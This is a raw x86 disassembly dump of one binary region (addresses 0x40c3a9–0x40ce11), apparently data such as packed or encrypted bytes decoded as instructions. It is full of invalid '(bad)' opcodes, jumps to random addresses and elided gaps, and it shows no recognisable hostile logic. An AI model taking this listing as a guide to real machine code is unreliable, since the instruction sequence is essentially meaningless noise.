  40c3a9:	xor    ebp,DWORD PTR [ecx-0x4cab9dd6]
  40c3af:	fnstsw WORD PTR [ebx+edi*1-0x67]
  40c3b3:	xlat   BYTE PTR ds:[ebx]
  40c3b4:	sbb    dh,dl
  40c3b6:	cdq    
  40c3b7:	(bad)  
  40c3b8:	(bad)  
  40c3b9:	aas    
  40c3ba:	dec    ebp
  40c3bb:	fmul   DWORD PTR [eax-0x12fb59c]
  40c3c1:	pop    dx
  40c3c3:	sbb    eax,0x452d5ea6
  40c3c8:	add    cl,al
  40c3ca:	aad    0x34
  40c3cc:	inc    ecx
  40c3cd:	jmp    0x3f30d1fe
  40c3d2:	or     eax,0x51b4fed8
  40c3d7:	mov    edi,0x8044
	...
  40c404:	or     eax,0x166488d8
  40c409:	sar    dh,1
  40c40b:	es fcom st(6)
  40c40e:	and    ax,0x1c00
  40c412:	add    BYTE PTR [esi],dl
  40c414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c415:	retf   
  40c416:	test   BYTE PTR [esi],0x6d
  40c419:	(bad)  
  40c41a:	je     0x40c411
  40c41c:	xor    eax,0x4cfea981
  40c421:	in     al,0x84
  40c423:	or     DWORD PTR [ebp-0x2a],eax
  40c426:	inc    BYTE PTR [ebx+0x43a2433d]
  40c42c:	add    edx,edi
  40c42e:	std    
  40c42f:	xchg   esp,eax
  40c430:	sub    eax,0x2cd6fece
  40c435:	push   eax
  40c436:	or     al,0xc1
  40c438:	cmp    al,0x4
  40c43a:	inc    esi
  40c43c:	pop    edx
  40c43d:	loopne 0x40c42a
  40c43f:	mov    dh,0xc
  40c441:	(bad)  
  40c442:	imul   ebp,ecx,0x285a02a5
  40c448:	cmp    dl,dh
  40c44a:	mov    ah,0x99
  40c44c:	je     0x40c424
  40c44e:	(bad)  
  40c44f:	sahf   
  40c450:	mul    BYTE PTR [edx-0x18]
  40c453:	popf   
  40c454:	add    eax,0xb660fed6
  40c459:	ret    
  40c45a:	test   BYTE PTR [eax],0xc0
  40c45d:	mov    DWORD PTR [edx+0x0],ebp
  40c460:	das    
  40c461:	xor    BYTE PTR [edx+0x41],bl
  40c464:	xchg   edi,eax
  40c465:	mov    DWORD PTR [ebp+0xf0],esi
	...
  40c48f:	add    BYTE PTR [eax],al
  40c491:	add    BYTE PTR [eax],cl
  40c493:	mov    edi,edi
  40c495:	call   FWORD PTR [edx-0x3026192a]
  40c49b:	mov    edi,edi
  40c49d:	mov    edx,ebx
  40c49f:	and    eax,0xdcf0fff7
  40c4a4:	mov    esp,0xff8918e4
  40c4a9:	add    BYTE PTR [edx-0x8427e29],cl
  40c4af:	nop
  40c4b0:	(bad)  
  40c4b1:	call   DWORD PTR [edi+0xe]
  40c4b4:	and    DWORD PTR fs:[edx+0x50fff776],0x5a
  40c4bc:	je     0x40c51a
  40c4be:	xchg   esp,eax
  40c4bf:	dec    ebx
  40c4c0:	call   0xc9f5bc
  40c4c5:	je     0x40c47b
  40c4c7:	icebp  
  40c4c8:	(bad)  
  40c4c9:	inc    DWORD PTR [eax+0x4c]
  40c4cc:	push   DWORD PTR [ebp+0x1f]
  40c4cf:	jb     0x40c50c
  40c4d1:	mov    ds:0xb5ff8c10,al
  40c4d6:	adc    edx,DWORD PTR [edi+edi*8+0x70e10ff]
  40c4dd:	call   0x400242
  40c4e2:	lock dec ebp
  40c4e4:	call   0xffccc5e0
  40c4e9:	jne    0x40c4ba
  40c4eb:	jno    0x40c46e
  40c4ed:	mov    ds:0xb5ff8b90,al
  40c4f2:	sti    
  40c4f3:	xchg   ebx,eax
  40c4f4:	(bad)  
  40c4f5:	inc    DWORD PTR [eax]
	...
  40c51f:	add    al,ah
  40c521:	or     eax,0x3d54e807
  40c526:	(bad)  
  40c527:	(bad)  
  40c528:	ds in  eax,dx
  40c52a:	jbe    0x40c50c
  40c52c:	test   eax,0x13ff30e4
  40c531:	int3   
  40c532:	sbb    ah,BYTE PTR [ebp-0x24]
  40c535:	push   esp
  40c536:	xor    edi,edi
  40c538:	shr    edi,cl
  40c53a:	cmp    bh,bh
  40c53c:	add    DWORD PTR [edi+esi*4+0x7],0xff651466
  40c544:	jno    0x40c57a
  40c546:	ja     0x40c52c
  40c548:	jno    0x40c576
  40c54a:	xor    eax,ebp
  40c54c:	daa    
  40c54d:	fbstp  TBYTE PTR [eax]
  40c54f:	call   FWORD PTR [ecx+0x56]
  40c552:	and    al,0xf7
  40c554:	push   ecx
  40c555:	xchg   esp,eax
  40c556:	sbb    al,0x2e
  40c558:	mov    ds:0x8bff318c,eax
  40c55d:	xchg   edi,eax
  40c55e:	cmp    edi,edi
  40c560:	cmp    DWORD PTR [ebx-0x1b],ebp
  40c563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c564:	xor    DWORD PTR [esi+0x31],esi
  40c567:	mov    ch,0x16
  40c569:	jbe    0x40c59c
  40c56b:	call   DWORD PTR [esi]
  40c56d:	retf   
  40c56e:	call   FWORD PTR gs:[ecx]
  40c571:	pop    esi
  40c572:	ja     0x40c550
  40c574:	or     esi,edx
  40c576:	das    
  40c577:	call   0xff71ecb7
  40c57c:	add    DWORD PTR [eax-0x420608cc],edx
  40c582:	das    
  40c583:	jne    0x40c585
	...
  40c5ad:	add    BYTE PTR [edx-0x4b],al
  40c5b0:	mov    ch,0x7
  40c5b2:	(bad)  
  40c5b3:	outs   dx,DWORD PTR ds:[esi]
  40c5b4:	xor    bh,bh
  40c5b6:	loope  0x40c55d
  40c5b8:	jne    0x40c5aa
  40c5ba:	rcr    DWORD PTR [ebp-0x213017d1],1
  40c5c0:	das    
  40c5c1:	dec    ecx
  40c5c3:	xchg   DWORD PTR [ecx+ebp*8],ebp
  40c5c6:	outs   dx,DWORD PTR ds:[esi]
  40c5c7:	add    al,0x30
  40c5c9:	(bad)  
  40c5ca:	mov    ecx,0xa6301c5b
  40c5cf:	data16 js 0x40c5d5
  40c5d2:	mov    ds:0x2fa1ffaa,al
  40c5d8:	bound  ebx,QWORD PTR [edi]
  40c5da:	mov    ebp,0x919d849f
  40c5df:	inc    edx
  40c5e0:	(bad)  
  40c5e1:	xor    BYTE PTR [ebx],dl
  40c5e3:	arpl   WORD PTR [ecx+0x6dd4dc04],ax
  40c5e9:	jp     0x40c5ee
  40c5eb:	xlat   BYTE PTR ds:[ebx]
  40c5ec:	rcl    BYTE PTR [ecx+0x14],1
  40c5ef:	sbb    ch,cl
  40c5f1:	xor    BYTE PTR [ebx],dh
  40c5f3:	add    eax,0xd561c2a1
  40c5f8:	sar    ebx,cl
  40c5fa:	popa   
  40c5fb:	int    0x43
  40c5fd:	xor    BYTE PTR [ecx+0x43],dl
  40c600:	pop    ds
  40c601:	int    0xfe
  40c603:	pop    edx
  40c604:	rol    DWORD PTR ds:0x30695b3e,0xb3
  40c60b:	arpl   WORD PTR [ecx],dx
  40c60d:	daa    
  40c60e:	xor    edx,esp
  40c610:	sbb    eax,0x30
	...
  40c639:	add    BYTE PTR [eax],al
  40c63b:	add    BYTE PTR [ebx+0x39b615d7],dh
  40c641:	ret    
  40c642:	mul    BYTE PTR [ebp+0x19]
  40c645:	aam    0x2f
  40c647:	inc    ebp
  40c648:	cmp    bl,BYTE PTR [ebx-0x6c]
  40c64b:	jl     0x40c667
  40c64d:	fisubr DWORD PTR [edi+ebx*1]
  40c650:	or     esp,edx
  40c652:	in     eax,dx
  40c653:	jge    0x40c5d8
  40c655:	xlat   BYTE PTR ds:[ebx]
  40c656:	cmp    BYTE PTR [edi],ch
  40c658:	imul   ebp,DWORD PTR [ebx-0x22],0xffffffb9
  40c65c:	xor    eax,0x3e9486c3
  40c661:	pop    ebx
  40c662:	loop   0x40c6a7
  40c664:	dec    ecx
  40c665:	fidiv  WORD PTR [ebp+0x4]
  40c668:	ds pop ebx
  40c66a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c66b:	leave  
  40c66c:	rcr    DWORD PTR [edx+0x0],1
  40c66f:	jmp    0x250821b1
  40c674:	jbe    0x40c64a
  40c676:	push   es
  40c677:	jmp    0x134107b9
  40c67c:	inc    edx
  40c67d:	inc    ecx
  40c67e:	add    BYTE PTR [ebx],al
  40c680:	cmp    ah,dh
  40c682:	inc    esp
  40c683:	xchg   ebp,eax
  40c684:	jb     0x40c66c
  40c686:	test   BYTE PTR [ebp+0x49],bh
  40c689:	aam    0xfe
  40c68b:	sbb    DWORD PTR [ecx+0x4e],ebx
  40c68e:	clc    
  40c68f:	jbe    0x40c658
  40c691:	iret   
  40c692:	out    0x4f,eax
  40c694:	rcr    BYTE PTR [edx+0x0],cl
  40c697:	repnz std 
  40c699:	dec    esi
  40c69a:	add    dl,BYTE PTR [edx-0x79]
  40c69d:	out    0x84,al
  40c69f:	inc    ebp
	...
  40c6c8:	add    BYTE PTR [eax],al
  40c6ca:	sub    esp,edx
  40c6cc:	(bad)  
  40c6cd:	mov    ecx,0x3ef3ddbe
  40c6d2:	and    esp,edx
  40c6d4:	dec    edi
  40c6d5:	xchg   DWORD PTR ds:[ebx-0x1],esp
  40c6d9:	mov    esp,0x8640bb41
  40c6de:	imul   edx,edx,0xca6a6c88
  40c6e4:	(bad)  
  40c6e5:	push   ds
  40c6e6:	and    eax,0xbccb7413
  40c6eb:	adc    ah,ch
  40c6ed:	push   ss
  40c6ee:	imul   edx,edx,0x43427cff
  40c6f4:	add    cl,ch
  40c6f6:	sub    BYTE PTR [ecx],dl
  40c6f8:	(bad)  
  40c6f9:	cmp    al,0x5e
  40c6fb:	retf   0xeefe
  40c6fe:	sub    BYTE PTR [eax],cl
  40c700:	lock fisub WORD PTR [eax]
  40c703:	sar    dh,cl
  40c705:	push   esp
  40c706:	jmp    0xfed2:0x10a0b4ba
  40c70d:	xchg   esp,eax
  40c70e:	or     eax,0xf800feca
  40c713:	jbe    0x40c707
  40c715:	mov    ds:0x45ff8188,eax
  40c71a:	(bad)  
  40c71b:	jne    0x40c69d
  40c71d:	push   DWORD PTR [edx-0x75]
  40c720:	call   0x9efe36
  40c725:	leave  
  40c726:	aad    0xd2
  40c728:	(bad)  
  40c729:	push   esp
  40c72a:	sbb    al,0x72
  40c72c:	add    esp,0x0
	...
  40c757:	add    bl,cl
  40c759:	hlt    
  40c75a:	(bad)  
  40c75b:	imul   ebx,DWORD PTR [edi-0x50f78a7f],0x8ffa159
  40c765:	dec    edi
  40c766:	inc    ebp
  40c767:	cld    
  40c768:	aas    
  40c769:	pop    esi
  40c76a:	pop    ebx
  40c76b:	inc    ecx
  40c76c:	xor    DWORD PTR [di],0xfe97afae
  40c773:	inc    BYTE PTR [edx+0x825e6d6]
  40c779:	cmp    edi,0x3fa56468
  40c77f:	add    BYTE PTR [edi+0x5c],ch
  40c782:	add    BYTE PTR [eax],al
  40c784:	xlat   BYTE PTR ds:[ebx]
  40c785:	xor    BYTE PTR [ebp+0x8],0x7f
  40c789:	ins    DWORD PTR es:[edi],dx
  40c78a:	(bad)  
  40c78b:	call   FWORD PTR [eax-0xa]
  40c78e:	sbb    bl,BYTE PTR [ebx-0x2a]
  40c791:	pop    ebp
  40c792:	push   DWORD PTR ds:0x401679
  40c798:	dec    eax
  40c799:	adc    eax,DWORD PTR [edi]
  40c79b:	call   0x4048c7
  40c7a0:	scas   eax,DWORD PTR es:[edi]
  40c7a1:	popa   
  40c7a2:	pop    ebx
  40c7a3:	inc    ecx
  40c7a4:	pop    ss
  40c7a5:	test   BYTE PTR [eax],0x0
  40c7a8:	out    0xdd,eax
  40c7aa:	(bad)  
  40c7ab:	jne    0x40c79c
  40c7ad:	jne    0x40c79d
  40c7af:	dec    BYTE PTR [eax]
  40c7b1:	cmp    bh,0x75
  40c7b4:	ds test al,0x2c
  40c7b7:	jne    0x40c7ff
  40c7b9:	pushf  
  40c7ba:	mov    al,ss:0x0
	...
  40c7e4:	add    BYTE PTR [eax],al
  40c7e6:	rcr    DWORD PTR [eax-0x3bbd3dc6],1
  40c7ec:	aad    0x8a
  40c7ee:	ror    BYTE PTR [eax],cl
  40c7f0:	mov    bh,0xb
  40c7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7f3:	add    esp,DWORD PTR [ebp-0x1]
  40c7f6:	mov    cl,0xcc
  40c7f8:	inc    edx
  40c7f9:	je     0x40c7f3
  40c7fb:	imul   edx,edi,0x5a
  40c7fe:	inc    ebx
  40c800:	shl    bh,cl
  40c802:	or     bl,BYTE PTR [ecx]
  40c804:	sub    eax,0xd473eeff
  40c809:	les    ebx,FWORD PTR ds:[bp+di]
  40c80d:	mov    esi,0x40c80916
  40c812:	ds je  0x40c842
  40c815:	jne    0x40c85d
  40c817:	sub    al,0xf7
  40c819:	retf   
  40c81a:	imul   esi,DWORD PTR [eax],0xc43f67cc
  40c820:	sbb    edi,DWORD PTR [esi+0x40c7f7e6]
  40c826:	ds hlt 
  40c828:	sub    esi,DWORD PTR [ebp+0x36]
  40c82b:	sub    al,0xe3
  40c82d:	retf   
  40c82e:	inc    ecx
  40c82f:	mov    ah,cl
  40c831:	addr16 cmp al,0xc2
  40c834:	sbb    edi,DWORD PTR [esi+0x40c80ba6]
  40c83a:	adc    ch,BYTE PTR ds:[esi*2-0x3400a5ca]
  40c842:	sbb    DWORD PTR [edx+0x1c],esp
  40c845:	push   ss
  40c846:	fstp   QWORD PTR [ecx+0x2d]
  40c849:	leave  
	...
  40c872:	add    BYTE PTR [eax],al
  40c874:	cld    
  40c875:	retf   0x5502
  40c878:	mov    ch,0x56
  40c87a:	add    esp,0x6a02dcfa
  40c880:	push   edi
  40c881:	pop    ebx
  40c882:	out    0xb6,al
  40c884:	inc    ecx
  40c885:	ret    
  40c886:	and    BYTE PTR [ecx+eiz*8-0x30],ah
  40c88a:	pop    edi
  40c88b:	(bad)  
  40c88c:	aad    0x45
  40c88e:	repz sub al,0x4b
  40c891:	arpl   cx,dx
  40c893:	or     ecx,0xffffffd0
  40c896:	mov    ebp,0x3bd01c99
  40c89b:	cld    
  40c89c:	mov    eax,ds:0xb12cae49
  40c8a1:	inc    ebp
  40c8a2:	add    eax,0x9163332d
  40c8a7:	lahf   
  40c8a8:	mov    al,ds:0x132c95d0
  40c8ad:	iret   
  40c8ae:	lea    esi,[esi+0x641ac339]
  40c8b4:	mov    eax,edx
  40c8b6:	scas   eax,DWORD PTR es:[edi]
  40c8b7:	inc    ecx
  40c8b8:	cmp    bl,BYTE PTR [ebx+0x1c]
  40c8bb:	jns    0x40c927
  40c8bd:	fsub   QWORD PTR [edi+ebp*1+0x1bf54671]
  40c8c4:	inc    esp
  40c8c5:	clc    
  40c8c6:	pop    ebp
  40c8c7:	sub    al,0x35
  40c8c9:	fwait
  40c8ca:	in     eax,0x87
  40c8cc:	popf   
  40c8cd:	pop    ebx
  40c8ce:	jmp    0x45578fd6
  40c8d3:	or     bl,0x6a
  40c8d6:	jmp    0x40c992
	...
  40c8ff:	add    BYTE PTR [eax],al
  40c901:	add    BYTE PTR [ebx],dh
  40c903:	sar    BYTE PTR [ebx+0x2d463913],1
  40c909:	sbb    edx,edi
  40c90b:	clc    
  40c90c:	and    eax,0x1d15b72c
  40c911:	fwait
  40c912:	xchg   ecx,eax
  40c913:	xor    al,0xa8
  40c915:	add    ebx,DWORD PTR [ecx]
  40c917:	inc    esi
  40c918:	or     eax,0x5f94b1b
  40c91d:	sub    al,0x6e
  40c91f:	inc    ebx
  40c920:	jmp    0x51da28
  40c925:	cdq    
  40c926:	sub    al,BYTE PTR [esi+0x8]
  40c929:	add    ecx,ecx
  40c92b:	mov    ds:0xdd4ae6fe,al
  40c930:	mov    eax,ds:0x9e4315de
  40c935:	xor    al,BYTE PTR [ebx]
  40c937:	sar    ch,1
  40c939:	push   esp
  40c93a:	es ret 
  40c93c:	adc    ecx,DWORD PTR [edi+0x514fd015]
  40c942:	cmp    ebx,DWORD PTR [ebx-0x11]
  40c945:	ja     0x40c8d9
  40c947:	shl    BYTE PTR [ecx+eiz*8+0x55],1
  40c94b:	dec    esp
  40c94c:	enter  0x55a6,0xc3
  40c950:	pusha  
  40c951:	dec    ebx
  40c952:	push   ebp
  40c953:	shl    BYTE PTR [edi+0x6d],1
  40c956:	mov    DWORD PTR [edx],ebx
  40c958:	add    BYTE PTR [esi+0x7ae7d3cf],cl
  40c95e:	pop    ds
  40c95f:	sar    dh,1
  40c961:	sbb    DWORD PTR [edx+0x86fecf],esp
	...
  40c98f:	add    ah,ah
  40c991:	sub    bh,bh
  40c993:	hlt    
  40c994:	jne    0x40c94d
  40c996:	push   ecx
  40c997:	xor    DWORD PTR ds:0xdba9e7d0,edx
  40c99d:	iret   
  40c99e:	inc    cl
  40c9a0:	into   
  40c9a1:	xor    eax,DWORD PTR [ecx-0x17]
  40c9a4:	and    al,0x46
  40c9a6:	cld    
  40c9a7:	push   ecx
  40c9a8:	lock cmc 
  40c9aa:	(bad)  
  40c9ab:	ds push 0x37
  40c9ae:	add    ecx,ebp
  40c9b0:	push   esp
  40c9b1:	or     eax,0x56ef2e50
  40c9b6:	call   0xff0f2f93
  40c9bb:	adc    DWORD PTR ds:0x6516fef9,esi
  40c9c1:	dec    eax
  40c9c2:	cld    
  40c9c3:	add    DWORD PTR ds:0x4000fef9,ebp
  40c9c9:	nop
  40c9ca:	ret    0x170c
  40c9cd:	lods   al,BYTE PTR ds:[esi]
  40c9ce:	mov    esp,ebp
  40c9d0:	fs sbb edi,esp
  40c9d3:	push   0xffffffe7
  40c9d5:	lock sbb bh,bh
  40c9d8:	mov    cl,bh
  40c9da:	out    0x39,al
  40c9dc:	pusha  
  40c9dd:	cmp    edi,0x6a832a89
  40c9e3:	add    BYTE PTR [ebp+0x5d],bh
  40c9e6:	push   DWORD PTR [ebp-0x31]
  40c9e9:	jb     0x40ca0d
  40c9eb:	inc    DWORD PTR [eax-0x2ff957f]
  40c9f1:	mov    ch,0xfd
  40c9f3:	jne    0x40c9f5
	...
  40ca1d:	add    BYTE PTR [edi-0x1f00e98e],bl
  40ca23:	sub    DWORD PTR [edx+0x0],0x75ff634d
  40ca2a:	lahf   
  40ca2b:	jb     0x40ca37
  40ca2d:	inc    eax
  40ca2f:	sub    DWORD PTR [eax-0x2e],0x69fe985c
  40ca36:	popf   
  40ca37:	xor    DWORD PTR [ebp+0x8],0xfffe7dbf
  40ca3e:	loopne 0x40ca31
  40ca40:	rcr    BYTE PTR [ebx-0x6a],1
  40ca43:	pop    edx
  40ca44:	push   0x23
  40ca46:	add    BYTE PTR [ebx],cl
  40ca48:	pop    es
  40ca49:	call   0x404e51
  40ca4e:	jg     0x40ca78
  40ca50:	pop    ebx
  40ca51:	inc    ecx
  40ca52:	push   edi
  40ca53:	lock sbb bh,bh
  40ca56:	mov    dl,dl
  40ca58:	out    0xdd,al
  40ca5a:	jno    0x40c9dd
  40ca5c:	(bad)  
  40ca5d:	(bad)  
  40ca5e:	jmp    0x2072:0x2f75ff75
  40ca65:	lahf   
  40ca66:	inc    eax
  40ca67:	or     ecx,0x2c03ec2
  40ca6d:	push   ebp
  40ca6e:	(bad)
  40ca71:	les    edx,FWORD PTR [esi]
  40ca73:	int    0x28
  40ca75:	push   DWORD PTR [ebx-0x6afd90a]
  40ca7b:	dec    esi
  40ca7c:	adc    edi,edi
  40ca7e:	imul   esi,DWORD PTR [eax+0xb81a],0x0
	...
  40caa9:	add    BYTE PTR [eax],al
  40caab:	add    BYTE PTR [ebx-0x1f4fd3d],bh
  40cab1:	mov    esp,0xc43f477d
  40cab6:	add    al,bh
  40cab8:	jnp    0x40ca66
  40caba:	add    eax,DWORD PTR [eax]
  40cabc:	les    edi,FWORD PTR ds:[edi]
  40cabf:	inc    ebp
  40cac0:	retf   0x10c
  40cac3:	add    BYTE PTR [esi],bh
  40cac5:	sbb    al,BYTE PTR [edx+ebp*2]
  40cac8:	sbb    al,BYTE PTR ds:[edx+ebp*2]
  40cacc:	ds inc edi
  40cace:	mov    edi,0x7f3f0ef3
  40cad3:	hlt    
  40cad4:	xchg   ecx,eax
  40cad5:	in     al,0x28
  40cad7:	push   eax
  40cad8:	xchg   ecx,eax
  40cad9:	data16 sub al,0xff
  40cadc:	adc    ebx,eax
  40cade:	sbb    ecx,DWORD PTR [edx+0xb02c3b3]
  40cae4:	jle    0x40cab5
  40cae6:	std    
  40cae7:	call   0x438e30
  40caec:	(bad)  
  40caed:	dec    ecx
  40caee:	mov    esp,0xaf2d3e40
  40caf3:	pcmpgtd mm1,QWORD PTR [eax+0x1351ff60]
  40cafa:	jl     0x40cacc
  40cafc:	mov    ebx,0x41f7303e
  40cb01:	mov    esp,ss
  40cb03:	push   ecx
  40cb04:	es jp  0x40cb67
  40cb07:	push   DWORD PTR [ecx]
  40cb09:	cmp    al,0x7f
  40cb0b:	lock xor DWORD PTR [esi+eiz*1+0x29],ebx
	...
  40cb38:	add    BYTE PTR [eax],al
  40cb3a:	push   ss
  40cb3b:	jnp    0x40cb85
  40cb3d:	sub    DWORD PTR [ecx],ebx
  40cb3f:	inc    edx
  40cb40:	jmp    0xa87019e0
  40cb45:	add    ecx,DWORD PTR [ecx]
  40cb47:	pop    es
  40cb48:	stc    
  40cb49:	xor    BYTE PTR [ecx],al
  40cb4b:	int    0xfd
  40cb4d:	scas   al,BYTE PTR es:[edi]
  40cb4e:	inc    ebp
  40cb4f:	ret    
  40cb50:	int3   
  40cb51:	pop    edi
  40cb52:	icebp  
  40cb53:	int3   
  40cb54:	pop    edi
  40cb55:	jg     0x40cb31
  40cb57:	(bad)  
  40cb58:	in     eax,0x28
  40cb5a:	push   esp
  40cb5b:	pop    ebx
  40cb5c:	push   ecx
  40cb5d:	out    0x75,eax
  40cb5f:	sbb    ch,cl
  40cb61:	sub    BYTE PTR [ebx-0x36d72a35],cl
  40cb67:	int3   
  40cb68:	cmp    edi,eax
  40cb6a:	fldenv [edx-0x7b]
  40cb6d:	sub    BYTE PTR [ecx-0x56e4941e],bh
  40cb73:	int3   
  40cb74:	lods   eax,DWORD PTR ds:[esi]
  40cb75:	test   bl,ch
  40cb77:	mov    edi,0x5ba1289d
  40cb7c:	adc    eax,0xe95b21f4
  40cb81:	sbb    al,dl
  40cb83:	inc    ebx
  40cb84:	nop
  40cb85:	int3   
  40cb86:	(bad)  
  40cb87:	pop    edx
  40cb88:	xchg   BYTE PTR [esi-0x6e],ch
  40cb8b:	les    edi,FWORD PTR [ebp+0x28]
  40cb8e:	jns    0x40cbd6
  40cb90:	loope  0x40cbad
  40cb92:	mov    dl,0xa2
  40cb94:	ins    DWORD PTR es:[edi],dx
  40cb95:	sub    dh,dl
  40cb97:	pop    ecx
  40cb98:	jmp    0xea846bb5
  40cb9d:	mov    DWORD PTR [eax],0x0
	...
  40cbc7:	add    dh,bh
  40cbc9:	pop    edx
  40cbca:	push   esi
  40cbcb:	outs   dx,BYTE PTR ds:[esi]
  40cbcc:	(bad)  
  40cbcd:	les    ecx,FWORD PTR [ebp+0x28]
  40cbd0:	dec    ecx
  40cbd1:	inc    esi
  40cbd2:	icebp  
  40cbd3:	sbb    ebx,DWORD PTR [edx-0x42d7c25e]
  40cbd9:	or     eax,0xcc6e4100
  40cbde:	(bad)  
  40cbdf:	jmp    0xe9a947bd
  40cbe4:	cmp    eax,0x6491bdbc
  40cbe9:	xor    BYTE PTR [ecx-0x17],al
  40cbec:	pushw  es
  40cbee:	call   0xff0d2209
  40cbf3:	jl     0x40cbfa
  40cbf5:	mov    ah,0x82
  40cbf7:	xor    BYTE PTR [esi],ah
  40cbf9:	int3   
  40cbfa:	addr16 call 0x81fe883d
  40cc00:	inc    edx
  40cc01:	das    
  40cc02:	inc    ecx
  40cc03:	jmp    0xd728d220
  40cc08:	and    esp,ecx
  40cc0a:	(bad)  
  40cc0b:	pop    esp
  40cc0c:	shl    BYTE PTR [ebx-0x33de5f96],cl
  40cc12:	(bad)  
  40cc13:	jl     0x40cc3b
  40cc15:	(bad)  
  40cc16:	(bad)  
  40cc17:	mov    esi,0xb6a03d5a
  40cc1c:	pop    ecx
  40cc1d:	int3   
  40cc1e:	mov    ah,0xc1
  40cc20:	pop    ecx
  40cc21:	int3   
  40cc22:	(bad)  
  40cc23:	xchg   ecx,eax
  40cc24:	fucomp st(3)
  40cc26:	(bad)  
  40cc27:	sahf   
  40cc28:	popa   
  40cc29:	push   es
  40cc2a:	lock sahf 
	...
  40cc54:	add    BYTE PTR [eax],al
  40cc56:	pop    ecx
  40cc57:	int3   
  40cc58:	(bad)  
  40cc59:	adc    al,0x86
  40cc5b:	int3   
  40cc5c:	je     0x40cc4f
  40cc5e:	and    eax,0x217efe07
  40cc63:	int3   
  40cc64:	mov    ah,0x79
  40cc66:	and    esp,ecx
  40cc68:	inc    BYTE PTR [ecx+0x66feeba9]
  40cc6e:	sbb    DWORD PTR [esi],edx
  40cc70:	clc    
  40cc71:	push   eax
  40cc72:	sbb    cl,ch
  40cc74:	(bad)  
  40cc75:	push   esi
  40cc76:	sbb    DWORD PTR [esi-0x4],eax
  40cc79:	inc    ecx
  40cc7a:	popf   
  40cc7b:	(bad)  
  40cc7d:	call   DWORD PTR [edi-0x72]
  40cc80:	ret    0x270c
  40cc83:	lods   al,BYTE PTR ds:[esi]
  40cc84:	mov    esp,ebp
  40cc86:	push   0x97e80b0c
  40cc8b:	cmp    edi,edi
  40cc8d:	jmp    FWORD PTR [edi+ebx*1]
  40cc90:	je     0x40cccb
  40cc92:	scas   eax,DWORD PTR es:[edi]
  40cc93:	ret    
  40cc94:	pop    edx
  40cc95:	inc    ecx
  40cc96:	daa    
  40cc97:	scas   eax,DWORD PTR es:[edi]
  40cc98:	out    0xc,al
  40cc9a:	add    DWORD PTR [edx-0x1958af01],0xfffffffe
  40cca1:	dec    DWORD PTR [eax+0x41]
  40cca4:	push   0xfe9fccf9
  40cca9:	dec    edi
  40ccaa:	fmul   DWORD PTR [ebx]
  40ccac:	pop    es
  40ccad:	call   0x4053b3
  40ccb2:	jg     0x40cc9b
  40ccb4:	(bad)  
  40ccb5:	(bad)  
  40ccb6:	clc    
  40ccb7:	inc    eax
  40ccb8:	push   0x3
	...
  40cce1:	add    BYTE PTR [eax],al
  40cce3:	add    BYTE PTR [ebx],bl
  40cce5:	mov    al,ds:0xbf84ffe
  40ccea:	pop    es
  40cceb:	call   0x405375
  40ccf0:	jg     0x40cd57
  40ccf2:	lahf   
  40ccf3:	(bad)  
  40ccf4:	fadd   DWORD PTR [edi-0x5468f73e]
  40ccfa:	mov    esp,ebp
  40ccfc:	and    al,0x8a
  40ccfe:	cld    
  40ccff:	push   esi
  40cd00:	push   eax
  40cd01:	in     eax,0xfe
  40cd03:	imul   ecx,DWORD PTR [ecx+eax*4-0x3a50f78b],0x46f8ff9b
  40cd0e:	inc    ebp
  40cd0f:	cld    
  40cd10:	fmul   st(2),st
  40cd12:	xor    BYTE PTR [eax+0x16],cl
  40cd15:	pop    edi
  40cd16:	mov    edi,DWORD PTR ds:0x400741
  40cd1c:	out    0xc0,eax
  40cd1e:	dec    BYTE PTR [esi]
  40cd20:	cmp    BYTE PTR ds:[edx+0x0],ch
  40cd24:	ds mov ah,0x9a
  40cd27:	in     eax,dx
  40cd28:	in     eax,0xf2
  40cd2a:	add    dl,BYTE PTR [esi+0x26]
  40cd2d:	shl    BYTE PTR [esi+0x0],cl
  40cd30:	ds mov ebp,0xf4787442
  40cd36:	cmp    BYTE PTR [eax],0x3e
  40cd39:	sar    DWORD PTR [esi-0x79],1
  40cd3c:	ds mov ah,0x2
  40cd3f:	push   eax
  40cd40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd41:	(bad)  
  40cd42:	retf   0x3e40
  40cd45:	pop    esp
  40cd46:	cwde   
  40cd47:	mov    DWORD PTR [eax],eax
	...
  40cd71:	add    BYTE PTR [esi],bh
  40cd73:	mov    ah,0xc8
  40cd75:	add    bh,ah
  40cd77:	jecxz  0x40cd93
  40cd79:	pusha  
  40cd7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd7b:	shl    BYTE PTR [eax+edx*2],1
  40cd7e:	mov    ds,esp
  40cd80:	add    al,BYTE PTR [eax]
  40cd82:	rol    DWORD PTR [ecx],1
  40cd84:	pushf  
  40cd85:	clc    
  40cd86:	jne    0x40cdfb
  40cd88:	add    al,0x50
  40cd8a:	shl    DWORD PTR [esi],1
  40cd8c:	cld    
  40cd8d:	out    0x55,eax
  40cd8f:	cld    
  40cd90:	and    al,0xff
  40cd92:	data16 sub al,0x3
  40cd95:	add    BYTE PTR [ecx+0x12029c49],ch
  40cd9b:	jae    0x40cda1
  40cd9d:	push   eax
  40cd9e:	test   eax,0x9e7fc8e
  40cda3:	or     al,0x25
  40cda5:	jmp    DWORD PTR [esi-0x6e007aad]
  40cdab:	fadd   st(0),st
  40cdad:	addr16 mov al,ds:0xc38c
  40cdb1:	(bad)  
  40cdb2:	call   0x3ecc0aa2
  40cdb7:	mov    ah,0xf7
  40cdb9:	mov    edi,0xe7cd07ea
  40cdbe:	inc    ebp
  40cdbf:	sbb    esp,DWORD PTR ds:0xb95b0eff
  40cdc5:	fwait
  40cdc6:	pop    ecx
  40cdc7:	leave  
  40cdc8:	dec    ebp
  40cdc9:	data16 out 0xc3,al
  40cdcc:	mov    cl,0xc2
  40cdce:	dec    ecx
  40cdcf:	sbb    DWORD PTR [esi-0x51],ecx
  40cdd2:	cmp    DWORD PTR [ebx+0x3c0e],esi
	...
  40ce00:	cmp    ecx,ecx
  40ce02:	mov    al,ds:0x465b3e9b
  40ce07:	xchg   si,ax
  40ce09:	pop    esp
  40ce0a:	(bad)  
  40ce0b:	ret    0x1921
  40ce0e:	es scas eax,DWORD PTR es:[edi]
  40ce10:	inc    ecx
  40ce11:	mov    bl,0xfa
